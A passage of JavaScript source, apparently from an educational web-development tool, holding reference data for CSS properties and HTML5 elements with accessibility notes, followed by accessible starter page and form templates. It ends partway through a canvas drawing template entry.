      commonMistakes: ['Fixed height that clips content', 'Using height: 100% without context'],
    },
    {
      property: 'line-height',
      shorthand: false,
      whatItDoes: 'Vertical spacing between lines of text.',
      values: 'number | length | percentage | normal',
      defaultValue: 'normal',
      inherits: 'yes',
      animatable: 'yes',
      a11yNotes: 'WCAG 1.4.12: minimum 1.5 for body text.',
      example: 'body { line-height: 1.6; }\nh1 { line-height: 1.2; }\nh2 { line-height: 1.3; }',
      browserSupport: 'All browsers',
      commonMistakes: ['Tight line-height makes text cramped', 'Pixel-based line-height (use unitless)'],
    },
    {
      property: 'margin',
      shorthand: true,
      whatItDoes: 'Outer space around the element (between this element and others).',
      values: 'margin: top right bottom left; OR margin: vertical horizontal; OR margin: all;',
      defaultValue: '0',
      inherits: 'no',
      animatable: 'yes',
      a11yNotes: 'No direct accessibility impact, but adequate spacing helps readability.',
      example: '/* All sides */\n.box { margin: 16px; }\n\n/* Vertical + horizontal */\n.box { margin: 16px 24px; }\n\n/* Centered (auto on left + right) */\n.container { width: 800px; margin: 0 auto; }',
      browserSupport: 'All browsers',
      commonMistakes: ['Margin collapse (vertical margins of adjacent elements combine)', 'Using margin on flex/grid items (use gap)'],
    },
    {
      property: 'opacity',
      shorthand: false,
      whatItDoes: 'Element transparency. 0 = invisible, 1 = solid.',
      values: 'opacity: 0 to 1;',
      defaultValue: '1',
      inherits: 'no',
      animatable: 'yes',
      a11yNotes: 'Low opacity reduces contrast. Don\'t use for important text.',
      example: '/* Hover effect */\n.button:hover { opacity: 0.9; }\n\n/* Disabled state */\n.disabled { opacity: 0.5; }\n\n/* Fade in animation */\n.fade-in { animation: fadeIn 0.3s; }\n@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }',
      browserSupport: 'All browsers',
      commonMistakes: ['Using opacity: 0 instead of display: none (still in tab order)', 'Low opacity destroys contrast'],
    },
    {
      property: 'overflow',
      shorthand: false,
      whatItDoes: 'Controls what happens when content exceeds element size.',
      values: 'visible | hidden | scroll | auto | clip',
      defaultValue: 'visible',
      inherits: 'no',
      animatable: 'no',
      a11yNotes: 'overflow: hidden can clip important content. Test with text scaling.',
      example: '.scrollable { overflow-y: auto; max-height: 300px; }\n.fixed { overflow: hidden; }\n.clipped { overflow-x: clip; }',
      browserSupport: 'All browsers',
      commonMistakes: ['Hiding overflow + clipping important content', 'No scrollbar styling (default may be ugly)'],
    },
    {
      property: 'padding',
      shorthand: true,
      whatItDoes: 'Inner space (between element edge and content).',
      values: 'padding: top right bottom left; OR padding: vertical horizontal; OR padding: all;',
      defaultValue: '0',
      inherits: 'no',
      animatable: 'yes',
      a11yNotes: 'Adequate padding makes clickable areas easier to hit.',
      example: '.box { padding: 16px; }\n.card { padding: 24px 32px; }\nbutton { padding: 12px 24px; }',
      browserSupport: 'All browsers',
      commonMistakes: ['Padding too small makes touch targets fail WCAG (44x44 min)', 'Padding affects box-sizing calculations'],
    },
    {
      property: 'position',
      shorthand: false,
      whatItDoes: 'How an element is positioned relative to its containing block.',
      values: 'static | relative | absolute | fixed | sticky',
      defaultValue: 'static',
      inherits: 'no',
      animatable: 'no',
      a11yNotes: 'Sticky/fixed elements can cover content or focus indicators.',
      example: '/* Tooltip */\n.tooltip-container { position: relative; }\n.tooltip { position: absolute; top: 100%; left: 0; }\n\n/* Sticky header */\nheader { position: sticky; top: 0; }\n\n/* Modal */\n.modal { position: fixed; inset: 0; }',
      browserSupport: 'All browsers',
      commonMistakes: ['z-index issues without position: relative', 'Forgetting how absolute positioning needs a positioned ancestor'],
    },
    {
      property: 'text-align',
      shorthand: false,
      whatItDoes: 'Horizontal text alignment.',
      values: 'left | right | center | justify | start | end',
      defaultValue: 'start',
      inherits: 'yes',
      animatable: 'no',
      a11yNotes: 'Center-aligned body text is harder to read. Justify can create awkward word spacing.',
      example: '.center { text-align: center; }\np { text-align: left; }\n.numeric { text-align: right; }',
      browserSupport: 'All browsers',
      commonMistakes: ['Center-aligning long body text', 'Justifying body text without hyphenation'],
    },
    {
      property: 'text-decoration',
      shorthand: true,
      whatItDoes: 'Adds lines (underline, overline, strikethrough) to text.',
      values: 'text-decoration: line style color thickness;',
      defaultValue: 'none',
      inherits: 'no',
      animatable: 'no',
      a11yNotes: 'Underline is the standard for links. Don\'t remove without replacement.',
      example: 'a { text-decoration: underline; }\n.strike-through { text-decoration: line-through; }\n.custom-underline { text-decoration: underline #2563eb 2px; }',
      browserSupport: 'All modern browsers',
      commonMistakes: ['Removing link underline without alternative visual indicator', 'Underlining non-link text (confusing)'],
    },
    {
      property: 'transform',
      shorthand: false,
      whatItDoes: 'Apply 2D or 3D transformation (rotate, scale, translate, skew).',
      values: 'transform: translate(x, y) | rotate(deg) | scale(n) | skew(x, y) | matrix() | perspective()',
      defaultValue: 'none',
      inherits: 'no',
      animatable: 'yes',
      a11yNotes: 'Respect prefers-reduced-motion. Limit dramatic transforms.',
      example: '/* Translate (move) */\n.shifted { transform: translateX(20px); }\n\n/* Rotate */\n.rotated { transform: rotate(45deg); }\n\n/* Scale */\n.bigger { transform: scale(1.1); }\n\n/* Combined */\n.flipped { transform: rotate(180deg) scale(0.8); }',
      browserSupport: 'All modern browsers',
      commonMistakes: ['Animating layout properties (use transform for performance)', 'Forgetting reduced-motion preference'],
    },
    {
      property: 'transition',
      shorthand: true,
      whatItDoes: 'Smooth animation between property values.',
      values: 'transition: property duration timing-function delay;',
      defaultValue: 'all 0s ease 0s',
      inherits: 'no',
      animatable: 'no (itself)',
      a11yNotes: 'Respect prefers-reduced-motion.',
      example: '.button { transition: background 0.2s ease; }\n.button:hover { background: #1e40af; }\n\n/* Multiple */\n.card { transition: transform 0.3s ease, box-shadow 0.3s ease; }',
      browserSupport: 'All modern browsers',
      commonMistakes: ['Animating expensive properties (use transform + opacity)', 'No prefers-reduced-motion fallback'],
    },
    {
      property: 'width',
      shorthand: false,
      whatItDoes: 'Sets element width.',
      values: 'auto | length | percentage | min-content | max-content | fit-content',
      defaultValue: 'auto',
      inherits: 'no',
      animatable: 'yes',
      a11yNotes: 'Fixed widths can break responsive design. Test with browser zoom.',
      example: '/* Fixed */\n.box { width: 200px; }\n\n/* Container */\n.container { max-width: 1200px; margin: 0 auto; }\n\n/* Responsive */\n.full { width: 100%; }',
      browserSupport: 'All browsers',
      commonMistakes: ['Fixed width that breaks on small screens', 'Using width instead of max-width'],
    },
    {
      property: 'z-index',
      shorthand: false,
      whatItDoes: 'Stacking order of positioned elements.',
      values: 'auto | integer',
      defaultValue: 'auto',
      inherits: 'no',
      animatable: 'yes',
      a11yNotes: 'High z-index can cover focus indicators. Test keyboard navigation.',
      example: '/* Modal on top of everything */\n.modal { position: fixed; z-index: 1000; }\n\n/* Tooltip above content */\n.tooltip { position: absolute; z-index: 10; }',
      browserSupport: 'All browsers',
      commonMistakes: ['z-index without position (no effect)', 'z-index arms race (use named scales)'],
    },
  ];

  // ─── HTML5 element reference (every standard element) ─────────────
  // Each entry: tag, category, what-it-does, semantic-role, key-attributes,
  // accessibility-notes, example, when-to-use, when-to-avoid.
  var HTML5_FULL_REFERENCE = [
    {
      tag: 'a',
      category: 'Inline',
      whatItDoes: 'Hyperlink to another resource.',
      semanticRole: 'link',
      keyAttributes: 'href (required), target, rel, download, type',
      a11yNotes: 'Link text must be meaningful. Avoid "click here." Indicate external links.',
      example: '<a href="https://example.com">Visit Example</a>',
      whenUse: 'For all navigation between pages or to external resources.',
      whenAvoid: 'For non-navigation actions (use <button>).',
      browserSupport: 'All browsers, all versions.',
    },
    {
      tag: 'abbr',
      category: 'Inline',
      whatItDoes: 'Marks abbreviated text with full expansion in title.',
      semanticRole: 'definition',
      keyAttributes: 'title (the full expansion)',
      a11yNotes: 'Screen readers may announce the title. Helps users understand abbreviations.',
      example: '<abbr title="HyperText Markup Language">HTML</abbr>',
      whenUse: 'First use of an abbreviation in content.',
      whenAvoid: 'For common abbreviations everyone knows.',
      browserSupport: 'All modern browsers.',
    },
    {
      tag: 'address',
      category: 'Block',
      whatItDoes: 'Contact info for the article or document author.',
      semanticRole: 'contentinfo (when in article context)',
      keyAttributes: 'None specific',
      a11yNotes: 'Conveys "this is contact info" to screen readers.',
      example: '<address>\n  Email: <a href="mailto:author@example.com">author@example.com</a>\n  Phone: 555-1234\n</address>',
      whenUse: 'In article or document for author contact info.',
      whenAvoid: 'For arbitrary mailing addresses (use <p>).',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'article',
      category: 'Block',
      whatItDoes: 'A self-contained composition (blog post, news item, forum thread).',
      semanticRole: 'article (landmark)',
      keyAttributes: 'aria-labelledby (recommended)',
      a11yNotes: 'Screen reader landmark. Should have a heading or aria-labelledby.',
      example: '<article aria-labelledby="post-title">\n  <h2 id="post-title">My First Post</h2>\n  <p>Content...</p>\n</article>',
      whenUse: 'For independent, standalone pieces of content.',
      whenAvoid: 'For layout-only divs. For content that depends on context.',
      browserSupport: 'All modern browsers.',
    },
    {
      tag: 'aside',
      category: 'Block',
      whatItDoes: 'Content tangentially related to the main content.',
      semanticRole: 'complementary (landmark)',
      keyAttributes: 'aria-label (when multiple asides)',
      a11yNotes: 'Screen reader landmark.',
      example: '<aside aria-label="Related links">\n  <h3>See also</h3>\n  <ul>...</ul>\n</aside>',
      whenUse: 'For sidebar content, pull quotes, related links.',
      whenAvoid: 'For main content.',
      browserSupport: 'All modern browsers.',
    },
    {
      tag: 'audio',
      category: 'Embedded',
      whatItDoes: 'Embed audio file.',
      semanticRole: 'application (for media)',
      keyAttributes: 'src, controls, autoplay (avoid!), loop, muted',
      a11yNotes: 'Provide transcript link. Avoid autoplay.',
      example: '<audio controls>\n  <source src="podcast.mp3" type="audio/mp3">\n  Your browser does not support audio.\n</audio>',
      whenUse: 'For audio content.',
      whenAvoid: 'Background music (use Web Audio API + user control).',
      browserSupport: 'All modern browsers.',
    },
    {
      tag: 'b',
      category: 'Inline',
      whatItDoes: 'Stylistic bold (NOT emphatic).',
      semanticRole: 'No semantic meaning',
      keyAttributes: 'None',
      a11yNotes: 'Screen readers ignore unless visible boldness is critical.',
      example: '<p><b>Lawyers, doctors, engineers</b> are professionals.</p>',
      whenUse: 'For stylistic emphasis (e.g., book titles, keywords).',
      whenAvoid: 'For semantic importance (use <strong>).',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'base',
      category: 'Metadata',
      whatItDoes: 'Sets the base URL + target for all relative URLs.',
      semanticRole: 'No semantic role',
      keyAttributes: 'href, target',
      a11yNotes: 'No direct a11y impact.',
      example: '<base href="https://example.com/" target="_blank">',
      whenUse: 'When you want all relative URLs to use a specific base.',
      whenAvoid: 'Usually not needed. Can confuse routing.',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'blockquote',
      category: 'Block',
      whatItDoes: 'A block-level quotation from another source.',
      semanticRole: 'No special landmark',
      keyAttributes: 'cite (source URL)',
      a11yNotes: 'Screen readers may announce "quote" + "end of quote".',
      example: '<blockquote cite="https://source.com">\n  <p>"Be the change you wish to see..."</p>\n  <cite>Mahatma Gandhi</cite>\n</blockquote>',
      whenUse: 'For long quotes (block-level).',
      whenAvoid: 'For short inline quotes (use <q>). For indentation (use CSS).',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'body',
      category: 'Structural',
      whatItDoes: 'Container for all visible content.',
      semanticRole: 'No special role',
      keyAttributes: 'No specific (style + class for general)',
      a11yNotes: 'Should be the parent of all visible content. Don\'t hide entirely.',
      example: '<body>\n  <main>...</main>\n</body>',
      whenUse: 'Always — exactly one per document.',
      whenAvoid: 'Never omit.',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'br',
      category: 'Inline',
      whatItDoes: 'Line break.',
      semanticRole: 'No semantic role',
      keyAttributes: 'None (void element)',
      a11yNotes: 'Use sparingly. CSS margin/padding usually better.',
      example: '<p>Line 1<br>Line 2</p>',
      whenUse: 'For poetic line breaks (poetry, addresses).',
      whenAvoid: 'For paragraph breaks (use <p>). For spacing (use CSS).',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'button',
      category: 'Form',
      whatItDoes: 'A clickable button.',
      semanticRole: 'button',
      keyAttributes: 'type (button/submit/reset), disabled, autofocus',
      a11yNotes: 'Native keyboard support (Enter + Space). Has accessible name from text content or aria-label.',
      example: '<button type="button" onclick="doThing()">Click me</button>',
      whenUse: 'For any clickable action.',
      whenAvoid: 'For navigation (use <a>). Avoid type="submit" unless you want to submit a form.',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'canvas',
      category: 'Embedded',
      whatItDoes: 'Drawing surface for JavaScript graphics.',
      semanticRole: 'img (when used for images)',
      keyAttributes: 'width, height',
      a11yNotes: 'Canvas content is inaccessible. Provide fallback inside <canvas> tags + aria-label.',
      example: '<canvas id="game" width="800" height="400" aria-label="Game canvas">\n  Your browser does not support canvas.\n</canvas>',
      whenUse: 'For dynamic graphics + games + visualizations.',
      whenAvoid: 'For static images (use <img>). For text (canvas text is inaccessible).',
      browserSupport: 'All modern browsers.',
    },
    {
      tag: 'caption',
      category: 'Table',
      whatItDoes: 'Title for a table.',
      semanticRole: 'No special role',
      keyAttributes: 'None',
      a11yNotes: 'Screen readers announce the caption when entering the table.',
      example: '<table>\n  <caption>Q1 Sales</caption>\n  ...\n</table>',
      whenUse: 'For every data table.',
      whenAvoid: 'For non-data tables (don\'t use tables for layout).',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'cite',
      category: 'Inline',
      whatItDoes: 'Title of a cited work.',
      semanticRole: 'No specific role',
      keyAttributes: 'None',
      a11yNotes: 'Screen readers may use italics inferred from default styling.',
      example: '<p>Read <cite>The Great Gatsby</cite> by Fitzgerald.</p>',
      whenUse: 'For book/movie/song titles.',
      whenAvoid: 'For authors\' names (use plain text).',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'code',
      category: 'Inline',
      whatItDoes: 'Computer code.',
      semanticRole: 'No specific role',
      keyAttributes: 'None',
      a11yNotes: 'Screen readers may announce "code".',
      example: '<p>Use <code>console.log()</code> to debug.</p>',
      whenUse: 'For inline code (variable names, function names).',
      whenAvoid: 'For block code (use <pre><code>).',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'col, colgroup',
      category: 'Table',
      whatItDoes: 'Define column properties for a table.',
      semanticRole: 'No specific role',
      keyAttributes: 'span',
      a11yNotes: 'Helps screen readers + styling.',
      example: '<table>\n  <colgroup>\n    <col span="2" style="background: yellow;">\n  </colgroup>\n  <tr><th>Col 1</th><th>Col 2</th></tr>\n</table>',
      whenUse: 'For styling whole columns.',
      whenAvoid: 'For simple tables (use class on cells).',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'data',
      category: 'Inline',
      whatItDoes: 'Associates content with a machine-readable value.',
      semanticRole: 'No specific role',
      keyAttributes: 'value (the machine-readable value)',
      a11yNotes: 'Screen reader announces text content; value is for scripts.',
      example: '<p>The product is <data value="123">Awesome Widget</data>.</p>',
      whenUse: 'When you need a machine-readable + human-readable representation.',
      whenAvoid: 'For dates (use <time>).',
      browserSupport: 'All modern browsers.',
    },
    {
      tag: 'datalist',
      category: 'Form',
      whatItDoes: 'List of suggested values for an input.',
      semanticRole: 'listbox',
      keyAttributes: 'id (referenced by list= attribute on input)',
      a11yNotes: 'Native typeahead suggestions.',
      example: '<input list="browsers">\n<datalist id="browsers">\n  <option value="Chrome">\n  <option value="Firefox">\n</datalist>',
      whenUse: 'For autocomplete suggestions.',
      whenAvoid: 'For required-from-list values (use <select>).',
      browserSupport: 'All modern browsers.',
    },
    {
      tag: 'dd, dt, dl',
      category: 'List',
      whatItDoes: 'Definition list. <dl> wraps. <dt> is term. <dd> is definition.',
      semanticRole: 'list',
      keyAttributes: 'None specific',
      a11yNotes: 'Screen readers announce as "definition list".',
      example: '<dl>\n  <dt>HTML</dt>\n  <dd>HyperText Markup Language</dd>\n  <dt>CSS</dt>\n  <dd>Cascading Style Sheets</dd>\n</dl>',
      whenUse: 'For glossaries, key-value pairs.',
      whenAvoid: 'For ordered or unordered lists (use <ol>, <ul>).',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'del, ins',
      category: 'Inline',
      whatItDoes: '<del> = deleted text. <ins> = inserted text.',
      semanticRole: 'No specific role',
      keyAttributes: 'cite (URL), datetime',
      a11yNotes: 'Screen readers may announce "deleted" / "inserted".',
      example: '<p>The price is <del>$50</del> <ins>$40</ins>.</p>',
      whenUse: 'For documents that show edits.',
      whenAvoid: 'For simple styling (use CSS).',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'details, summary',
      category: 'Interactive',
      whatItDoes: 'Native expand/collapse widget.',
      semanticRole: 'button (summary), group (details)',
      keyAttributes: 'open',
      a11yNotes: 'Native keyboard support. Screen readers announce expanded/collapsed.',
      example: '<details>\n  <summary>What is HTML?</summary>\n  <p>HyperText Markup Language...</p>\n</details>',
      whenUse: 'For FAQ items, additional details.',
      whenAvoid: 'Don\'t reinvent with JavaScript when this works.',
      browserSupport: 'All modern browsers (IE not supported).',
    },
    {
      tag: 'dialog',
      category: 'Interactive',
      whatItDoes: 'A modal dialog.',
      semanticRole: 'dialog',
      keyAttributes: 'open',
      a11yNotes: 'Native focus trap. showModal() blocks interaction with rest of page.',
      example: '<dialog id="confirm">\n  <p>Are you sure?</p>\n  <button onclick="confirm.close()">Cancel</button>\n</dialog>',
      whenUse: 'For modal dialogs.',
      whenAvoid: 'For non-modal content.',
      browserSupport: 'All modern browsers.',
    },
    {
      tag: 'div',
      category: 'Generic',
      whatItDoes: 'Generic block container.',
      semanticRole: 'No semantic meaning',
      keyAttributes: 'class, id (for CSS/JS)',
      a11yNotes: 'No semantic value. Screen readers skip empty divs.',
      example: '<div class="card">\n  <h3>Card</h3>\n</div>',
      whenUse: 'For layout/styling when no semantic element fits.',
      whenAvoid: 'When a semantic element (article, section, nav) would work. As a button — use <button>.',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'em',
      category: 'Inline',
      whatItDoes: 'Emphasized text — stressed pronunciation.',
      semanticRole: 'em',
      keyAttributes: 'None',
      a11yNotes: 'Screen readers may change pitch.',
      example: '<p>I <em>love</em> coding.</p>',
      whenUse: 'For words that change meaning when emphasized.',
      whenAvoid: 'For stylistic italic (use <i> or CSS).',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'embed',
      category: 'Embedded',
      whatItDoes: 'Embed external content (typically media/plugins).',
      semanticRole: 'document or img',
      keyAttributes: 'src, type, width, height',
      a11yNotes: 'Provide accessible name or fallback.',
      example: '<embed src="movie.swf" type="application/x-shockwave-flash" width="500" height="200">',
      whenUse: 'For embedding external plugin content.',
      whenAvoid: 'Mostly deprecated. Use <video>, <audio>, <iframe>.',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'fieldset, legend',
      category: 'Form',
      whatItDoes: 'Group form inputs with a caption.',
      semanticRole: 'group',
      keyAttributes: 'disabled, form, name',
      a11yNotes: 'Screen readers announce legend + then individual labels.',
      example: '<fieldset>\n  <legend>Gender</legend>\n  <label><input type="radio" name="gen"> Male</label>\n  <label><input type="radio" name="gen"> Female</label>\n</fieldset>',
      whenUse: 'For radio button groups, address fields, related form sections.',
      whenAvoid: 'For single inputs.',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'figure, figcaption',
      category: 'Block',
      whatItDoes: 'Self-contained content (image, diagram, table) with optional caption.',
      semanticRole: 'figure',
      keyAttributes: 'None specific',
      a11yNotes: 'Caption associated with figure. Screen readers may use figcaption as accessible name.',
      example: '<figure>\n  <img src="diagram.png" alt="Process diagram">\n  <figcaption>Figure 1: System flowchart</figcaption>\n</figure>',
      whenUse: 'For images, charts, code samples with captions.',
      whenAvoid: 'For inline content. For visual decoration.',
      browserSupport: 'All modern browsers.',
    },
    {
      tag: 'footer',
      category: 'Structural',
      whatItDoes: 'Footer of a page or section.',
      semanticRole: 'contentinfo (top-level only)',
      keyAttributes: 'None specific',
      a11yNotes: 'Top-level footer becomes contentinfo landmark.',
      example: '<footer>\n  <p>&copy; 2026 Site Name</p>\n</footer>',
      whenUse: 'End of page or section.',
      whenAvoid: 'For content that should be in <aside> or <nav>.',
      browserSupport: 'All modern browsers.',
    },
    {
      tag: 'form',
      category: 'Form',
      whatItDoes: 'Container for form inputs.',
      semanticRole: 'form (landmark)',
      keyAttributes: 'action, method, novalidate, target',
      a11yNotes: 'Form mode activates AT features. Should have accessible name.',
      example: '<form aria-label="Login" action="/login" method="POST">\n  <label for="email">Email</label>\n  <input type="email" id="email">\n  <button type="submit">Submit</button>\n</form>',
      whenUse: 'For any user input that gets submitted.',
      whenAvoid: 'For non-submitting layouts.',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'h1 through h6',
      category: 'Block',
      whatItDoes: 'Headings, with h1 being highest level.',
      semanticRole: 'heading',
      keyAttributes: 'None specific',
      a11yNotes: 'Screen readers create heading outline for navigation. Don\'t skip levels.',
      example: '<h1>Main Title</h1>\n<h2>Section</h2>\n<h3>Subsection</h3>',
      whenUse: 'For document structure.',
      whenAvoid: 'For visual styling (use CSS). Don\'t skip levels.',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'head',
      category: 'Metadata',
      whatItDoes: 'Container for metadata.',
      semanticRole: 'No specific role',
      keyAttributes: 'None',
      a11yNotes: 'Must include <title> + meta viewport for accessibility.',
      example: '<head>\n  <title>Page Title</title>\n  <meta charset="utf-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1">\n</head>',
      whenUse: 'Always — every HTML document has exactly one head.',
      whenAvoid: 'Never put visible content here.',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'header',
      category: 'Structural',
      whatItDoes: 'Introductory content for the page or a section.',
      semanticRole: 'banner (top-level only)',
      keyAttributes: 'None specific',
      a11yNotes: 'Becomes banner landmark when used at top-level.',
      example: '<header>\n  <h1>Site Title</h1>\n  <nav>...</nav>\n</header>',
      whenUse: 'Once per page (top-level) OR inside articles/sections.',
      whenAvoid: 'Avoid more than one top-level header per page.',
      browserSupport: 'All modern browsers.',
    },
    {
      tag: 'hgroup',
      category: 'Block',
      whatItDoes: 'Multi-level heading group.',
      semanticRole: 'No specific role',
      keyAttributes: 'None',
      a11yNotes: 'Modern usage debated. Often replaced with <header> or just <hN>.',
      example: '<hgroup>\n  <h1>Title</h1>\n  <h2>Subtitle</h2>\n</hgroup>',
      whenUse: 'When you have a title + subtitle that should be one logical heading.',
      whenAvoid: 'Usually. Use <h1> + <p class="subtitle"> instead.',
      browserSupport: 'All modern browsers.',
    },
    {
      tag: 'hr',
      category: 'Block',
      whatItDoes: 'Horizontal rule (thematic break).',
      semanticRole: 'separator',
      keyAttributes: 'None (void element)',
      a11yNotes: 'Screen readers announce as "separator".',
      example: '<p>End of section 1.</p>\n<hr>\n<p>Start of section 2.</p>',
      whenUse: 'For thematic breaks between content.',
      whenAvoid: 'For visual decoration (use CSS border).',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'html',
      category: 'Root',
      whatItDoes: 'Root element of HTML document.',
      semanticRole: 'No specific role',
      keyAttributes: 'lang, dir',
      a11yNotes: 'lang attribute is critical for screen readers + translation.',
      example: '<html lang="en">...</html>',
      whenUse: 'Always — must be the outermost wrapper.',
      whenAvoid: 'Never omit.',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'i',
      category: 'Inline',
      whatItDoes: 'Stylistic italic (alternate voice/mood).',
      semanticRole: 'No specific role',
      keyAttributes: 'None',
      a11yNotes: 'Screen readers ignore.',
      example: '<p>The word <i>per se</i> is Latin.</p>',
      whenUse: 'For foreign words, technical terms, thoughts.',
      whenAvoid: 'For emphasis (use <em>).',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'iframe',
      category: 'Embedded',
      whatItDoes: 'Embed another HTML document.',
      semanticRole: 'document or application',
      keyAttributes: 'src, title (required for a11y!), width, height, sandbox',
      a11yNotes: 'MUST have title attribute. Screen readers announce title.',
      example: '<iframe src="https://example.com" title="Example site" width="600" height="400"></iframe>',
      whenUse: 'For embedding external content.',
      whenAvoid: 'For your own content (use components).',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'img',
      category: 'Embedded',
      whatItDoes: 'Image.',
      semanticRole: 'img (when alt provided)',
      keyAttributes: 'src (required), alt (required), width, height, loading',
      a11yNotes: 'MUST have alt. Decorative: alt="". Meaningful: describe what\'s shown.',
      example: '<img src="logo.png" alt="School logo">',
      whenUse: 'For meaningful images.',
      whenAvoid: 'For decorative images (use CSS background).',
      browserSupport: 'All browsers.',
    },
    {
      tag: 'input',
      category: 'Form',
      whatItDoes: 'Form input. Type attribute changes behavior dramatically.',
      semanticRole: 'Varies by type (textbox, button, checkbox, etc.)',
      keyAttributes: 'type, name, value, placeholder, required, min, max, pattern',
      a11yNotes: 'MUST have associated <label>. type="email"/"number" helps mobile keyboards.',
      example: '<label for="email">Email</label>\n<input type="email" id="email" name="email" required>',
      whenUse: 'For all single-line inputs.',
      whenAvoid: 'For multi-line (use <textarea>). For complex choice (use <select>).',
      browserSupport: 'All browsers.',
    },
  ];

  // ─── Complete starter code templates (15 ready-to-go templates) ───
  // Each template is a full working HTML/CSS/JS file students can use.
  var STARTER_TEMPLATES = [
    {
      id: 'starter_blank',
      title: 'Blank Starter (with accessibility basics)',
      description: 'Minimal HTML5 document with accessibility features already configured.',
      code: '<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8">\n  <meta name="viewport" content="width=device-width, initial-scale=1">\n  <title>My App</title>\n  <style>\n    /* Reset + accessibility defaults */\n    *, *::before, *::after { box-sizing: border-box; }\n    body { font-family: system-ui, sans-serif; line-height: 1.6; margin: 0; padding: 0; color: #1a1a1a; background: #fff; }\n    main { max-width: 800px; margin: 40px auto; padding: 20px; }\n    h1 { color: #2563eb; }\n    button { padding: 10px 18px; font-size: 14px; cursor: pointer; border: none; border-radius: 6px; background: #2563eb; color: white; }\n    button:focus-visible { outline: 3px solid #1e40af; outline-offset: 2px; }\n    input { padding: 8px 12px; font-size: 14px; border: 1px solid #d1d5db; border-radius: 6px; }\n    input:focus-visible { outline: 2px solid #2563eb; outline-offset: 1px; }\n    /* Reduced motion */\n    @media (prefers-reduced-motion: reduce) { *, *::before, *::after { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; } }\n  </style>\n</head>\n<body>\n  <main>\n    <h1>My App</h1>\n    <p>Welcome to my app!</p>\n  </main>\n  <script>\n    // Your JavaScript here\n  </script>\n</body>\n</html>',
      whatNext: 'Customize the title + h1. Add content inside <main>. Add interactivity in <script>.',
    },
    {
      id: 'starter_form',
      title: 'Accessible Form Template',
      description: 'Fully accessible form with validation + error messages.',
      code: '<!DOCTYPE html>\n<html lang="en">\n<head>\n  <meta charset="UTF-8">\n  <title>Form</title>\n  <style>\n    *, *::before, *::after { box-sizing: border-box; }\n    body { font-family: system-ui, sans-serif; line-height: 1.6; padding: 20px; max-width: 500px; margin: 40px auto; }\n    label { display: block; margin: 16px 0 8px; font-weight: 600; }\n    input, textarea { width: 100%; padding: 10px; font-size: 14px; border: 1px solid #d1d5db; border-radius: 6px; }\n    input:focus, textarea:focus { outline: 2px solid #2563eb; outline-offset: 1px; }\n    .error { color: #dc2626; font-size: 13px; margin-top: 4px; }\n    button { margin-top: 20px; padding: 12px 24px; background: #2563eb; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }\n    input[aria-invalid="true"] { border-color: #dc2626; }\n    .success { background: #dcfce7; color: #166534; padding: 12px; border-radius: 6px; margin-top: 20px; }\n  </style>\n</head>\n<body>\n  <h1>Contact Form</h1>\n  <form id="contactForm" novalidate>\n    <label for="name">Name <span aria-label="required">*</span></label>\n    <input type="text" id="name" name="name" required aria-describedby="name-error">\n    <p id="name-error" class="error" hidden></p>\n    \n    <label for="email">Email <span aria-label="required">*</span></label>\n    <input type="email" id="email" name="email" required aria-describedby="email-error">\n    <p id="email-error" class="error" hidden></p>\n    \n    <label for="message">Message</label>\n    <textarea id="message" name="message" rows="4" aria-describedby="message-help"></textarea>\n    <p id="message-help" class="help">Optional. Tell us how we can help.</p>\n    \n    <button type="submit">Submit</button>\n  </form>\n  <div id="success" class="success" hidden role="status"></div>\n  \n  <script>\n    const form = document.getElementById("contactForm");\n    const success = document.getElementById("success");\n    \n    form.addEventListener("submit", function(e) {\n      e.preventDefault();\n      let valid = true;\n      \n      // Validate name\n      const name = document.getElementById("name");\n      const nameErr = document.getElementById("name-error");\n      if (!name.value.trim()) {\n        nameErr.textContent = "Name is required";\n        nameErr.hidden = false;\n        name.setAttribute("aria-invalid", "true");\n        valid = false;\n      } else {\n        nameErr.hidden = true;\n        name.removeAttribute("aria-invalid");\n      }\n      \n      // Validate email\n      const email = document.getElementById("email");\n      const emailErr = document.getElementById("email-error");\n      const emailPattern = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;\n      if (!email.value.trim() || !emailPattern.test(email.value)) {\n        emailErr.textContent = "Valid email is required";\n        emailErr.hidden = false;\n        email.setAttribute("aria-invalid", "true");\n        valid = false;\n      } else {\n        emailErr.hidden = true;\n        email.removeAttribute("aria-invalid");\n      }\n      \n      if (valid) {\n        success.textContent = "Thank you, " + name.value + "! Form submitted.";\n        success.hidden = false;\n        form.hidden = true;\n      }\n    });\n  </script>\n</body>\n</html>',
      whatNext: 'Add more fields. Hook up to a backend. Add success animation.',
    },
    {
      id: 'starter_canvas_drawing',
      title: 'Canvas Drawing App',
      description: 'Basic canvas-based drawing app with color picker + brush size.',
